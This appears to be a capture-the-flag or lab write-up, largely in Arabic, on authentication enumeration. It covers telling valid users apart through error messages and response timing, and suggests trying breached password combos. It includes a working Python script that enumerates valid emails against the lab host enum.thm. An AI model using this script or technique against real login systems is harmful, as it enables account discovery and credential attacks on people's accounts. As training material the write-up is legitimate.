# Enumeration & Brute Force



<img width="1901" height="378" alt="image" src="https://github.com/user-attachments/assets/1210bd29-1ad0-48db-adc8-e380059b40b5" />



<details>
  <summary>Authentication Enumeration</summary>


🧠 Authentication Enumeration -- الخلاصة العملية
-----------------------------------------------

### 🔍 يعني إيه؟

ببساطة:\
**بتحاول تعرف معلومات عن نظام الدخول من غير ما تسجل دخول فعلي**\
(يوزر موجود؟ سياسة الباسورد؟ في فرق ردود؟)

* * * * *

🎯 أهم حاجتين بنطلعهم
---------------------

### 1️⃣ هل اليوزر موجود ولا لأ

### 2️⃣ إيه سياسة الباسورد

* * * * *

🧪 الطرق العملية (اللي تهمك في التحديات)
----------------------------------------

### 🔑 1) صفحة الـ Login

ركز على **الرسائل**:

-   ❌ `Username not found`

-   ❌ `Incorrect password`

📌 لو في فرق =\
➡️ اليوزر صحيح\
➡️ نكمل عليه brute-force أو logic bug

* * * * *

### 🔁 2) Forgot Password

-   `User does not exist`

-   `Reset link sent`

📌 الفرق ده = **User Enumeration واضح**

* * * * *

### 📝 3) Register

-   `Username already taken`

-   `Email already registered`

📌 دي أسهل طريقة تجمع users list

* * * * *

### 🧾 4) Password Policy

لو شفت رسالة زي:

> Must contain uppercase, number, symbol

📌 معناها:

-   اعمل wordlist مخصص

-   متضيعش وقتك بكلام فاضي

مثال توليد باسوردات:

Password@123\
Admin#2026\
Love!Note9

* * * * *

### ⚠️ 5) Verbose Errors (الخطر الحقيقي)

أي فرق رد:

-   Status code

-   Message

-   Response time

📌 حتى **فرق 100ms** ممكن يكون user موجود

* * * * *

### 🧨 6) Data Breach

لو اليوزر طلع موجود:

-   جرب باسوردات شائعة

-   جرب combo من breaches

📌 دايمًا اليوزر هو المفتاح 🔑

* * * * *

🛠️ Tools تحبها
---------------

-   Burp Intruder

-   ffuf

-   wfuzz

-   curl + diff

-   custom wordlists


<img width="1628" height="215" alt="image" src="https://github.com/user-attachments/assets/5044fbfc-496d-4424-9fc4-afa5fc55338a" />



  
</details>



<details>
  <summary>Enumerating Users via Verbose Errors</summary>




> ### Below is a Python script that will check for valid emails in the target web app. Save the code below as script.py.


```python
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message for invalid emails

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
```



### We can use a common list of emails from this [repository](https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt).



```
python3 script.py emails.txt
```

<img width="917" height="366" alt="image" src="https://github.com/user-attachments/assets/178d10fc-e903-472f-8f3e-5bc03a5fef46" />




```
 canderson@gmail.com
```


  
</details>






































